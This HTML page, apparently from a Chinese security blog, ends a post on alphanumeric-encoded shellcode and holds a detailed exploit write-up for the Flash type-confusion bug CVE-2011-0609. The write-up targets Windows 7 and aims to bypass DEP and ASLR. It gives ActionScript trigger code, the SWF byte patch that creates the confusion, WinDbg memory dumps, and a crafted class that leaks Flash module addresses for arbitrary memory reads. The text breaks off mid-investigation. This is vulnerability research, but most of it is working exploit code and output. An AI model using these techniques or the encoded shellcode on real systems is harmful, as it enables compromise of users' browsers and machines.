"<span class="number">0q3w3w3</span>wAc<span class="number">2L8d8h2</span>E<span class="number">3V1S2j8</span>d<span class="number">210k2V1S54</span>5s1S2jAD<span class="number">210k1S241S210</span>h1Q2t8dAD<span class="number">2Q0C1u5</span>h2b0h4G"
"<span class="number">3w3w3w1</span>Q<span class="number">271Y0D28</span><span class="number">2020201Y0G242</span><span class="number">020208y0N2</span>E<span class="number">0f0C0h8</span>Y<span class="number">2020204x3v1</span>R<span class="number">562N0X0</span>b<span class="number">2C1Y0l28</span>2020"
"<span class="number">201Q0e0h2</span>m<span class="number">3w3w3w1</span>Q<span class="number">0B0k0b2</span>n<span class="number">1U2M241Q0</span>q<span class="number">1Y0A28202</span><span class="number">0200h063</span>w<span class="number">3w3w0k56</span><span class="number">2k8q3H5</span>h<span class="number">2c3w2e248</span>q"
"<span class="number">3H5h3w2</span>e<span class="number">280h0m3</span>w<span class="number">3w3w2S2</span>Q<span class="number">5T2S8n2</span>U2H2U20aa"<span class="comment">;//aa作为判断解码结束的中止符</span>
</code></pre><p>4.同理，然后我们进行两次宽窄字节转换并执行，结果如下所示：<br><img src="http://o9xrwsn0z.bkt.clouddn.com/Alphanumeric-shellcode-2.png" alt=""><br>由图中可以看出经过两次变换后shellcode并没有发生变化，最后能够正确执行。</p>
<h2 id="总结">总结</h2><p>1.这个是9月份分析的一个hwp文档漏洞，里边的shellcode用的是一种纯字母数字编码技术，当时研究了一周想把整个编码过程模拟出来，当时知识实在是欠缺，自己编写并提取一个弹出计算机的shellcode都花了两天时间，而且shellcode也不是通用的shellcode，是先通过一段程序将本机的kernel32和Loadlibrary函数地址找到，然后在会变里边直接调用，在后期编写代码的时候中间遇到了几个问题导致程序执行不下去。后来有安排有事，就把这个事情放着了一直没做，这几天闲下时候重新整理了出来，整个过程其实很简单，但是中间也学到了不少东西，也发现真的需要加强一下编程能力了！</p>
<p>2.给我印象最深刻的就是，在测试代码时候有一段代码我调试了很久才找到原因</p>
<pre><code><span class="keyword">Push</span> <span class="literal">ebp</span> 
<span class="keyword">mov</span> <span class="literal">ebp</span>,<span class="literal">esp</span>
<span class="keyword">lea</span> <span class="literal">eax</span>,sc   //sc为存放shellcode的数组
<span class="keyword">call</span> <span class="literal">eax</span>
</code></pre><p>在执行过第二行mov ebp,esp后，sc的地址就飞了，我当时想的是，汇编代码已经是最底层的代码了，两句汇编代码之间出问题，而且至始至终都没有用sc，这样错误该怎么找？最后调试很多次，是在vs里边查看汇编代码才发现，在一大堆c语言源码嵌入汇编代码，数组sc的指针是存放在[ebp+xx]处，所以在mov ebp,esp后自然sc的地址就飞了。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.idhyt.com/2012/12/18/technic-alphanumeric-shellcode/" data-id="civbwoo7e001w5p6igcb1lung" class="article-share-link">Share</a>
      
        <a href="http://blog.idhyt.com/2012/12/18/technic-alphanumeric-shellcode/#disqus_thread" class="article-comment-link">留言</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/shellcode/">shellcode</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-exploit-cve-2011-0609" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2012/11/20/exploit-cve-2011-0609/" class="article-date">
  <time datetime="2012-11-20T08:20:11.000Z" itemprop="datePublished">2012-11-20</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/exploit/">exploit</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2012/11/20/exploit-cve-2011-0609/">CVE-2011-0609</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>CVE-2011-0609漏洞利用记录，WIN7过DEP+ASLR</p>
<h2 id="简介">简介</h2><p>JIT代码在解析三元运算过程中由于逻辑缺陷造成了对象混淆，具体地说,它可以用同一个属性或者方法生成一个有效字节代码并可以访问两个不同的对象。</p>
<h2 id="调试环境和工具">调试环境和工具</h2><p>Windows7_32_CN,<br>flashplayer10_3r181_14_winax_debug (调试),<br>Adobe® Flash® Player Installer/Uninstaller 10.1 r82(触发),<br>Windbg,FlashDevelop,FlashBuilder,Flash解压缩工具,Yogda,010Editor</p>
<h2 id="漏洞触发">漏洞触发</h2><p>漏洞触发代码如下</p>
<pre><code><span class="package"><span class="keyword">package</span>
{</span>
    <span class="preprocessor"><span class="keyword">import</span> flash.external.ExternalInterface;</span>
    <span class="preprocessor"><span class="keyword">import</span> flash.utils.*;</span>
    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SearchJIT</span>
    </span>{

        <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">nice</span><span class="params">()</span><span class="type">:ByteArray</span>
        </span>{
            <span class="keyword">return</span> <span class="keyword">new</span> ByteArray();

        }
        <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">SearchJIT</span><span class="params">()</span>
        </span>{
            <span class="keyword">var</span> tttt:ByteArray = (<span class="number">1</span> == <span class="number">0</span>) ?nice() : (<span class="number">1</span> == <span class="number">0</span>) ? nice() : nice();
            Var tttl:String=<span class="keyword">new</span> String(<span class="string">"AAAAAAAAAAAAAAA......"</span>)
            tttl.length;
        }
    }
}
</code></pre><p>先用FlashDevelop编译然后导出realease版，名为1109.swf的swf格式文件，用flash解压缩工具将1109.swf文件解压为1109_1.swf，然后用Yogda打开，算出构造混淆所要跳过的字节数，经计算，需要将10 06 00 00改成10 11 00 00 如下图所示：<br><img src="http://o9xrwsn0z.bkt.clouddn.com/adobe-cve-2011-0609-001.png" alt=""></p>
<p>然后用010Editor打开修改10 06为10 11 修改过后如下图所示<br><img src="http://o9xrwsn0z.bkt.clouddn.com/adobe-cve-2011-0609-002.png" alt=""></p>
<p>这样一个数据混淆的swf文件就生成了，可以看出，获取length属性的代码已经单独成为一个模块了，在获取Sring 的length属性时候，验证机制没有进行严格检测将length属性强制转换成String，从而调用了ByteArray的length属性方法，导致读取数据出错。<br>用windbg加载出错代码为：</p>
<pre><code>0688afb8 8b4808          <span class="keyword">mov</span>     <span class="literal">ecx</span>,<span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [<span class="literal">eax</span>+<span class="number">8</span>]
0688afbb 8b89a0000000    <span class="keyword">mov</span>     <span class="literal">ecx</span>,<span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [<span class="literal">ecx</span>+<span class="number">0A0h</span>]
0688afc1 8d55b8          <span class="keyword">lea</span>     <span class="literal">edx</span>,[<span class="literal">ebp</span>-<span class="number">48h</span>]
0688afc4 8945b8          <span class="keyword">mov</span>     <span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [<span class="literal">ebp</span>-<span class="number">48h</span>],<span class="literal">eax</span>
0688afc7 8b01            <span class="keyword">mov</span> <span class="literal">eax</span>,<span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> [<span class="literal">ecx</span>]  <span class="literal">ds</span>:<span class="number">0023</span>:<span class="number">41414141</span>=????????
0688afc9 <span class="number">52</span>              <span class="keyword">push</span>    <span class="literal">edx</span>
0688afca 6a00            <span class="keyword">push</span>    <span class="number">0</span>
0688afcc <span class="number">51</span>              <span class="keyword">push</span>    <span class="literal">ecx</span>
0688afcd ffd0            <span class="keyword">call</span>    <span class="literal">eax</span>
</code></pre><p>dd eax 可以看到String在内存中的数据结构</p>
<pre><code><span class="number">0</span>:<span class="number">005</span>&gt; dd eax
<span class="number">05f</span>02718  <span class="number">05</span>caa618 <span class="number">40000002</span> <span class="number">05</span>d84d20 <span class="number">00000000</span>
<span class="number">05f</span>02728  <span class="number">00000162</span> <span class="number">0000001</span>a <span class="number">05</span>caa618 <span class="number">00000002</span>
<span class="number">05f</span>02738  <span class="number">05</span>bfc230 <span class="number">00000000</span> <span class="number">00000004</span> <span class="number">00000002</span>
<span class="number">05f</span>02748  <span class="number">05</span>caab68 <span class="number">00000002</span> <span class="number">05</span>eeb080 <span class="number">05</span>dd1ee0
<span class="number">05f</span>02758  <span class="number">05</span>ef6cd1 <span class="number">18000001</span> <span class="number">05</span>caad58 <span class="number">00000002</span>
<span class="number">05f</span>02768  <span class="number">05</span>efd040 <span class="number">05</span>ef2e38 <span class="number">05f</span>1a220 <span class="number">05e0</span>ff58
<span class="number">05f</span>02778  <span class="number">05</span>caa618 <span class="number">00000003</span> <span class="number">05</span>be6fd9 <span class="number">00000000</span>
<span class="number">05f</span>02788  <span class="number">00000003</span> <span class="number">00000012</span> <span class="number">05</span>caa618 <span class="number">00000003</span>
</code></pre><p>其中，[eax+8]存放着String字符串的指针，指向字符串存储的内容，[eax+10h]存放着字符串的长度，也就是length属性。</p>
<p>同样的道理，重新构造一个1109_2.swf文件，可以用String的方法来读ByteArray的length属性。代码如下：</p>
<pre><code><span class="package"><span class="keyword">package</span>
{</span>
    <span class="preprocessor"><span class="keyword">import</span> flash.display.Sprite;</span>
    <span class="preprocessor"><span class="keyword">import</span> flash.utils.ByteArray;</span>
    <span class="preprocessor"><span class="keyword">import</span> flash.external.ExternalInterface;</span>

    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> <span class="keyword">extends</span> <span class="title">Sprite</span>
    </span>{
       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">bla</span><span class="params">()</span><span class="type">:ByteArray</span>
       </span>{
           <span class="keyword">return</span> <span class="keyword">new</span> ByteArray();
       }
       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Main</span><span class="params">()</span>
       </span>{
           <span class="keyword">var</span> tl:ByteArray = (<span class="number">1</span> == <span class="number">0</span>) ? bla() : (<span class="number">1</span> == <span class="number">0</span>) ? bla() : bla();
           <span class="keyword">var</span> t:String = <span class="keyword">new</span> String(<span class="string">"AAAAAAAAAAAAAAA......"</span>);
           <span class="keyword">var</span> zz:uint= t.length;
           ExternalInterface.call(<span class="string">'alert'</span>,zz.toString(<span class="number">16</span>));
       }

    }
}
</code></pre><p>用ie加载1109_2.swf文件，这次没有报错，而是读出来了一个地址<br><img src="http://o9xrwsn0z.bkt.clouddn.com/adobe-cve-2011-0609-003.png" alt=""></p>
<p>用Windbg加载，然后 u 5d9dd78</p>
<pre><code><span class="number">0</span>:<span class="number">007</span>&gt; u 5d9dd78
05d9dd78 f8              <span class="keyword">clc</span>
05d9dd79 <span class="number">91</span>              <span class="keyword">xchg</span>    <span class="literal">eax</span>,<span class="literal">ecx</span>
05d9dd7a b005            <span class="keyword">mov</span>     <span class="literal">al</span>,<span class="number">5</span>
05d9dd7c <span class="number">0000</span>            <span class="keyword">add</span>     <span class="preprocessor">byte</span> <span class="preprocessor">ptr</span> [<span class="literal">eax</span>],<span class="literal">al</span>
</code></pre><p>很显然不是我们想要找的flash模块地址。<br>进行到这一步，再往下边分析，要成功混淆出来一个flash模块地址，首先要清楚ByteArray在内存中存放的数据结构了。</p>
<h2 id="混淆利用分析">混淆利用分析</h2><p>装上调试版本的flash：flashplayer10_3r181_14_winax_debug (调试版),然后用FlashBuilder4.0新建AS3项目，代码如下：<br><img src="http://o9xrwsn0z.bkt.clouddn.com/adobe-cve-2011-0609-004.png" alt=""></p>
<p>然后进行调试，运行到第12行代码以后，看变量窗口<br><img src="http://o9xrwsn0z.bkt.clouddn.com/adobe-cve-2011-0609-005.png" alt=""></p>
<p>记录ByteArray地址为04be0f41 (flash模块中实际地址为04be0f40),用Windbg加载 dd 04be0f40</p>
<pre><code><span class="number">0</span>:<span class="number">027</span>&gt; dd <span class="number">4</span>be0f40
<span class="number">04</span>be0f40  <span class="number">048</span>a40c8 <span class="number">00000003</span> <span class="number">059</span>ba600 <span class="number">059</span>bf6e8
<span class="number">04</span>be0f50  <span class="number">04</span>be0f58 <span class="number">00000044</span> <span class="number">048</span>a4008 <span class="number">048</span>a4000
<span class="number">04</span>be0f60  <span class="number">048</span>a4018 <span class="number">048</span>a3ffc <span class="number">047</span>a9598 <span class="number">05993030</span>
<span class="number">04</span>be0f70  <span class="number">04</span>b75810 <span class="number">05</span>a12fe8 <span class="number">00000000</span> <span class="number">059</span>c0000
<span class="number">04</span>be0f80  <span class="number">00001000</span> <span class="number">00000004</span> <span class="number">00000029</span> <span class="number">00000000</span>
<span class="number">04</span>be0f90  <span class="number">048</span>a3ff4 <span class="number">00000003</span> <span class="number">00000000</span> <span class="number">00000000</span>
<span class="number">04</span>be0fa0  <span class="number">0478</span>d508 <span class="number">00000003</span> <span class="number">00000002</span> <span class="number">04</span>be8450
<span class="number">04</span>be0fb0  <span class="number">04</span>c69f94 <span class="number">05</span>a120a0 <span class="number">04</span>c69f40 <span class="number">0000000</span>e
</code></pre><p>如上图可以看到ByteArray在内存中的数据结构，+0X3C处059c0000为ByteArray数据存放地址指针，指向其存放的内容。00004为length属性，后边00000029(十进制为41)为position属性。<br>dd 059c0000 可以看到写入的0x41414141</p>
<pre><code><span class="number">0</span>:<span class="number">027</span>&gt; dd <span class="number">059</span>c0000
<span class="number">059</span>c0000  <span class="number">41414141</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>
<span class="number">059</span>c0010  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>
</code></pre><h3 id="尝试">尝试</h3><p>既然ByteArray在内存中存放的数据结构不变，用String的length方法读不出来flash模块地址，那么是否可以自己构造一个函数，然后与ByteArray混淆呢？<br>ByteArray在内存中的结构</p>
<pre><code><span class="number">00000000</span>:  <span class="number">048</span>a40c8 <span class="number">00000003</span> <span class="number">059</span>ba600 <span class="number">059</span>bf6e8
<span class="number">00000010</span>:  <span class="number">04</span>be0f58 <span class="number">00000044</span> <span class="number">048</span>a4008 <span class="number">048</span>a4000
</code></pre><p>由上边可以看出，要获得048a4008(flash模块)这个地址，只需要我们构造一个函数，在相同的位置有一个length属性，然后用构造函数的方法来读取ByteArray的length，就能将想要的地址给读出来，构造函数形式如下</p>
<pre><code><span class="attribute">00000000</span>: <span class="string"> ???????? ???????? ???????? ????????</span>
<span class="attribute">00000010</span>: <span class="string"> ???????? ???????? xxxxxxxx ????????</span>
</code></pre><p>其中将xxxxxxxx这个地方设置一个length属性即可。<br>在FlashBuilder新建项目test，在项目中添加一个新的AS类，代码如下：</p>
<pre><code>package Poc
{
    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">People</span>
    </span>{

       <span class="keyword">public</span> <span class="keyword">var</span> a :<span class="keyword">uint</span> = <span class="number">0x41414141</span>;
       <span class="keyword">public</span> <span class="keyword">var</span> b :<span class="keyword">uint</span> = <span class="number">0x41414142</span>
       <span class="comment">// public  var length :uint = 0x41414143;</span>
       <span class="keyword">public</span> <span class="keyword">var</span> c :<span class="keyword">uint</span> = <span class="number">0x41414144</span>
       <span class="keyword">public</span> <span class="keyword">var</span> d :<span class="keyword">uint</span> = <span class="number">0x41414145</span>;
       <span class="keyword">public</span> <span class="keyword">var</span> e :<span class="keyword">uint</span> = <span class="number">0x41414146</span>;
       <span class="keyword">public</span> <span class="keyword">var</span> f :<span class="keyword">uint</span> = <span class="number">0x41414147</span>;
       <span class="keyword">public</span> <span class="keyword">var</span> g :<span class="keyword">uint</span> = <span class="number">0x41414148</span>;
       <span class="keyword">public</span> <span class="keyword">var</span> h :<span class="keyword">uint</span> = <span class="number">0x41414149</span>;
       <span class="keyword">public</span> <span class="keyword">var</span> i :<span class="keyword">uint</span> = <span class="number">0x4141414a</span>;
       <span class="keyword">public</span> <span class="keyword">var</span> j :<span class="keyword">uint</span> = <span class="number">0x4141414b</span>;
       <span class="keyword">public</span> <span class="keyword">var</span> k :<span class="keyword">uint</span> = <span class="number">0x4141414c</span>;
       <span class="keyword">public</span> <span class="keyword">var</span> l :<span class="keyword">uint</span> = <span class="number">0x4141414d</span>;
       <span class="keyword">public</span> <span class="keyword">var</span> m :<span class="keyword">uint</span> = <span class="number">0x4141414e</span>;
       <span class="keyword">public</span> <span class="keyword">var</span> n :<span class="keyword">uint</span> = <span class="number">0x4141414f</span>;

       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">People</span><span class="params">()</span>
       </span>{
           <span class="comment">//</span>
       }
    }
}
</code></pre><p>然后在主程序中调用这个类，代码如下：<br><img src="http://o9xrwsn0z.bkt.clouddn.com/adobe-cve-2011-0609-006.png" alt=""></p>
<p>进入调试模式，运行到第19行代码时，数据窗口显示出新定义的People地址<br><img src="http://o9xrwsn0z.bkt.clouddn.com/adobe-cve-2011-0609-007.png" alt=""></p>
<p>然后用windbg加载IE，dd 59ad040 查看自定义类在内存中的数据结构</p>
<pre><code><span class="number">0</span>:<span class="number">023</span>&gt; dd <span class="number">59</span>ad040
<span class="number">059</span>ad040  <span class="number">04</span>a05050 <span class="number">00000003</span> <span class="number">05957f</span>b8 <span class="number">059</span>ab1f0
<span class="number">059</span>ad050  <span class="number">41414141</span> <span class="number">41414142</span> <span class="number">41414143</span> <span class="number">41414144</span>
<span class="number">059</span>ad060  <span class="number">41414145</span> <span class="number">41414147</span> <span class="number">41414148</span> <span class="number">41414149</span>
<span class="number">059</span>ad070  <span class="number">4141414</span>a <span class="number">4141414</span>b <span class="number">4141414</span>c <span class="number">4141414</span>d
<span class="number">059</span>ad080  <span class="number">4141414</span>e <span class="number">4141414f</span> <span class="number">059</span>ad0d0 <span class="number">00000000</span>
<span class="number">059</span>ad090  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>
<span class="number">059</span>ad0a0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>
<span class="number">059</span>ad0b0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>
</code></pre><p>由上图可以看出，我们只需要将41414143的变量名c改为length，然后我们用我们构造的函数读取length的方法去读ByteArray的length，就可以读出来flash模块地址了。<br>将People类中注释去掉即可,然后到导出发行版本，用和前边同样的方法构造混淆的swf文件，将flash版本换成Adobe® Flash® Player Installer/Uninstaller 10.1 r82,载于ie中运行，读出地址<br><img src="http://o9xrwsn0z.bkt.clouddn.com/adobe-cve-2011-0609-008.png" alt=""></p>
<p>用windbg加载IE，然后u 5b091f8</p>
<pre><code><span class="number">0</span>:<span class="number">029</span>&gt; u <span class="number">5</span>b091f8
Flash10i!DllUnregisterServer+<span class="number">0x329825</span>:
<span class="number">05</span>b091f8 <span class="number">868e82050</span>d81    xchg    cl,byte ptr [esi-<span class="number">7</span>EF2FA7Eh]
<span class="number">05</span>b091fe <span class="number">8205</span>ca7c8205fc add byte ptr [Flash10i!DllUnregisterServer+<span class="number">0x482f7</span> (<span class="number">05827</span>cca)],<span class="number">0F</span>Ch
</code></pre><p>成功读出了flash模块地址。</p>
<h3 id="任意读地址">任意读地址</h3><p>通过这种方法，基本可以实现读ByteArray中任意地址了，将上边的People类改成如下代码：</p>
<pre><code>package Poc
{
    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">People</span>
    </span>{     
       <span class="keyword">public</span> <span class="keyword">var</span> a :<span class="keyword">uint</span> = <span class="number">0x41414141</span>;
       <span class="keyword">public</span> <span class="keyword">var</span> b :<span class="keyword">uint</span> = <span class="number">0x41414142</span>;
       <span class="keyword">public</span> <span class="keyword">var</span> c :<span class="keyword">uint</span> = <span class="number">0x41414143</span>; <span class="comment">//</span>
       <span class="keyword">public</span> <span class="keyword">var</span> d :<span class="keyword">uint</span> = <span class="number">0x41414144</span>;
       <span class="keyword">public</span> <span class="keyword">var</span> e :<span class="keyword">uint</span> = <span class="number">0x41414145</span>;
       <span class="keyword">public</span> <span class="keyword">var</span> f :<span class="keyword">uint</span> = <span class="number">0x41414146</span>;
       <span class="keyword">public</span> <span class="keyword">var</span> g :<span class="keyword">uint</span> = <span class="number">0x41414147</span>; <span class="comment">//</span>
       <span class="keyword">public</span> <span class="keyword">var</span> h :<span class="keyword">uint</span> = <span class="number">0x41414148</span>;
       <span class="keyword">public</span> <span class="keyword">var</span> i :<span class="keyword">uint</span> = <span class="number">0x41414149</span>;
       <span class="keyword">public</span> <span class="keyword">var</span> j :<span class="keyword">uint</span> = <span class="number">0x4141414a</span>;
       <span class="keyword">public</span> <span class="keyword">var</span> k :<span class="keyword">uint</span> = <span class="number">0x4141414b</span>;
       <span class="keyword">public</span> <span class="keyword">var</span> l :<span class="keyword">uint</span> = <span class="number">0x4141414c</span>;
       <span class="keyword">public</span> <span class="keyword">var</span> m :<span class="keyword">uint</span> = <span class="number">0x4141414d</span>;
       <span class="keyword">public</span> <span class="keyword">var</span> n :<span class="keyword">uint</span> = <span class="number">0x4141414e</span>;
       <span class="keyword">public</span> <span class="keyword">var</span> ...
       <span class="keyword">public</span> <span class="keyword">var</span> ...

       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">People</span><span class="params">()</span>
       </span>{

       }
    }
}
</code></pre><p>编译进入调试模式，然后windbg加载Ie查看People类在内存中的数据结构，如下所示</p>
<pre><code><span class="number">0</span>:<span class="number">021</span>&gt; dd <span class="number">45</span>d3080
<span class="number">045</span>d3080  <span class="number">687</span>d5050 <span class="number">00000003</span> <span class="number">0460</span>a868 <span class="number">045f</span>0550
<span class="number">045</span>d3090  <span class="number">41414141</span> <span class="number">41414142</span> <span class="number">41414143</span> <span class="number">41414144</span>
<span class="number">045</span>d30a0  <span class="number">41414145</span> <span class="number">41414147</span> <span class="number">41414148</span> <span class="number">41414149</span>
<span class="number">045</span>d30b0  <span class="number">4141414</span>a <span class="number">4141414</span>b <span class="number">4141414</span>c <span class="number">4141414</span>d
<span class="number">045</span>d30c0  <span class="number">4141414</span>e <span class="number">4141414f</span> <span class="number">41414141</span> <span class="number">41414142</span>
<span class="number">045</span>d30d0  <span class="number">41414143</span> <span class="number">41414144</span> <span class="number">41414145</span> <span class="number">41414147</span>
<span class="number">045</span>d30e0  <span class="number">41414148</span> <span class="number">41414149</span> <span class="number">4141414</span>a <span class="number">4141414</span>b
<span class="number">045</span>d30f0  <span class="number">4141414</span>c <span class="number">4141414</span>d <span class="number">4141414</span>e <span class="number">4141414f</span>
</code></pre><p>从偏移10h处开始，填充着我们构造的参数，只要我们在ByteArray偏移10h以后能找到任意一个flash模块地址，都可以通过构造函数混淆出来。<br>同理，在String结构中也存在很多的Flash模块地址，也可以用同样的方法去读String中的flash模块地址,用同样的方法都能够读出来，已测试成功。</p>
<h2 id="Realease_&amp;_Debug">Realease &amp; Debug</h2><p>实际应用中，自己构造的函数数据结构在realease版本和debug版本中略有差别</p>
<h3 id="任意读地址的坑">任意读地址的坑</h3><p>通过上边的分析，我们构造一个People类，下边为利用测试代码</p>
<pre><code><span class="package"><span class="keyword">package</span>
{</span>
    <span class="preprocessor"><span class="keyword">import</span> Poc.*;</span>

    <span class="preprocessor"><span class="keyword">import</span> flash.display.Sprite;</span>
    <span class="preprocessor"><span class="keyword">import</span> flash.external.ExternalInterface;</span>
    <span class="preprocessor"><span class="keyword">import</span> flash.utils.ByteArray;</span>

    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> <span class="keyword">extends</span> <span class="title">Sprite</span>
    </span>{
       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">people</span><span class="params">()</span><span class="type">:People</span>
       </span>{
           <span class="keyword">return</span> <span class="keyword">new</span> People;
       }
       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">b</span><span class="params">()</span><span class="type">:ByteArray</span>
       </span>{
           <span class="keyword">var</span> ba:ByteArray = <span class="keyword">new</span> ByteArray;
           ba.writeUnsignedInt(<span class="number">0x41424344</span>);
           ba.writeUnsignedInt(<span class="number">0x45464748</span>);
           <span class="keyword">return</span> ba;
           <span class="comment">//ExternalInterface.call('alert',0x41414141.toString(16));</span>
       }

       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span>
       </span>{
           <span class="keyword">var</span> a:People = (<span class="number">1</span> == <span class="number">0</span>) ? people() : (<span class="number">1</span> == <span class="number">0</span>) ? people() : people();
           <span class="comment">//var al:uint = a.length;</span>
           <span class="keyword">var</span> t:ByteArray = b();
           <span class="keyword">var</span> zz:uint= t.length;
           ExternalInterface.call(<span class="string">'alert'</span>,zz.toString(<span class="number">16</span>));

       }
    }
}
</code></pre><p>调试版本中，windbg看People在内存中数据结构如下：</p>
<pre><code><span class="number">0</span>:<span class="number">023</span>&gt; dd <span class="number">58</span>c1060
<span class="number">058</span>c1060  <span class="number">04665050</span> <span class="number">00000003</span> <span class="number">058f</span>8868 <span class="number">058</span>c0b98
<span class="number">058</span>c1070  <span class="number">41414141</span> <span class="number">41414142</span> <span class="number">41414143</span> <span class="number">41414144</span>
<span class="number">058</span>c1080  <span class="number">41414145</span> <span class="number">41414146</span> <span class="number">41414147</span> <span class="number">41414148</span>
<span class="number">058</span>c1090  <span class="number">41414149</span> <span class="number">4141414</span>a <span class="number">4141414</span>b <span class="number">4141414</span>c
<span class="number">058</span>c10a0  <span class="number">4141414</span>d <span class="number">4141414</span>e <span class="number">4141414f</span> <span class="number">00000000</span>
<span class="number">058</span>c10b0  <span class="number">058</span>c1100 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>
<span class="number">058</span>c10c0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>
<span class="number">058</span>c10d0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>
</code></pre><p>也就是说我们在数值为4141414c处的参数设置为length即可通过混淆或得ByteArray地址。<br>然后我们导出release版的swf文件，修改，载入ie，弹出的地址为：<br><img src="http://o9xrwsn0z.bkt.clouddn.com/adobe-cve-2011-0609-009.png" alt=""></p>
<p>Windbg加载，dd 5d091ec</p>
<pre><code><span class="number">0</span>:<span class="number">033</span>&gt; dd <span class="number">5</span>d091ec
<span class="number">05</span>d091ec  <span class="number">05</span>a28590 <span class="number">05</span>a27cfd <span class="number">05</span>a27edd <span class="number">05</span>a28e86
<span class="number">05</span>d091fc  <span class="number">05</span>a2810d <span class="number">05</span>a27cca fffffffc <span class="number">0000000</span>c
<span class="number">05</span>d0920c  fffffffc <span class="number">00000014</span> <span class="number">00000000</span> <span class="number">05</span>a28ea2
<span class="number">05</span>d0921c  <span class="number">05</span>a251f3 <span class="number">05</span>c20770 <span class="number">05</span>c20e50 <span class="number">05</span>c20ee0
<span class="number">05</span>d0922c  <span class="number">05</span>a27f3b <span class="number">05</span>c20140 <span class="number">05</span>a288ec <span class="number">05</span>c1ff80
<span class="number">05</span>d0923c  <span class="number">05</span>a27d30 <span class="number">05</span>c1ff40 <span class="number">05</span>c203e0 <span class="number">05</span>a27fa8
<span class="number">05</span>d0924c  <span class="number">05</span>a2894d <span class="number">05</span>c20470 <span class="number">05</span>a27ff2 <span class="number">05</span>a27d0d
<span class="number">05</span>d0925c  <span class="number">05</span>a288cd <span class="number">05</span>c1ffc0 <span class="number">05</span>c20650 <span class="number">05</span>c207a0
</code></pre><p>很明显，并不是我们写进去的0x41424344,0x45464748.也就是说，我们读出来的并不是想得到的ByteArray地址！</p>
<h3 id="填坑-任意读地址">填坑-任意读地址</h3><p>我们构造的类在内存中数据结构是什么样子呢，我们在windbg搜一下我们构造函数的数据</p>
<pre><code>s <span class="number">0</span> l?<span class="number">7f</span>ffffff <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">46</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">47</span>
<span class="number">061</span>b2425  <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">46</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">47</span>-<span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">48</span> <span class="number">41</span> <span class="number">41</span> <span class="number">41</span> <span class="number">49</span>  AAAFAAAGAAAHAAAI
</code></pre><p>我们看下内存061b2425附近的数据<br><img src="http://o9xrwsn0z.bkt.clouddn.com/adobe-cve-2011-0609-010.png" alt=""></p>
<p>如上图所示，构造函数的数据存放在061b2415-061b2451并不是按照顺序存放的。<br>我们读出来的地址是什么？</p>
<pre><code>s <span class="number">0</span> l?<span class="number">7f</span>ffffff ec <span class="number">91</span> d0 <span class="number">05</span>
<span class="number">020</span>bc908  ec <span class="number">91</span> d0 <span class="number">05</span> <span class="number">80</span> c9 <span class="number">0</span>b <span class="number">02</span>-<span class="number">68</span> <span class="number">18</span> <span class="number">33</span> <span class="number">06</span> <span class="number">00</span> <span class="number">80</span> <span class="number">24</span> <span class="number">06</span>  ........h<span class="number">.3</span>...$.
<span class="number">05</span>a28843  ec <span class="number">91</span> d0 <span class="number">05</span> <span class="number">8</span>b <span class="number">40</span> <span class="number">04</span> c7-<span class="number">44</span> <span class="number">30</span> <span class="number">20</span> e4 <span class="number">91</span> d0 <span class="number">05</span> <span class="number">8</span>b  .....@..D0 .....
<span class="number">0623</span>dd9c  ec <span class="number">91</span> d0 <span class="number">05</span> <span class="number">04</span> <span class="number">92</span> d0 <span class="number">05</span>-<span class="number">08</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ................
</code></pre><p>查看0623dd9c附近的数据<br><img src="http://o9xrwsn0z.bkt.clouddn.com/adobe-cve-2011-0609-011.png" alt=""></p>
<p>在05d091ec附近找到了06bbd000地址，形似ByteArray地址<br><img src="http://o9xrwsn0z.bkt.clouddn.com/adobe-cve-2011-0609-012.png" alt=""></p>
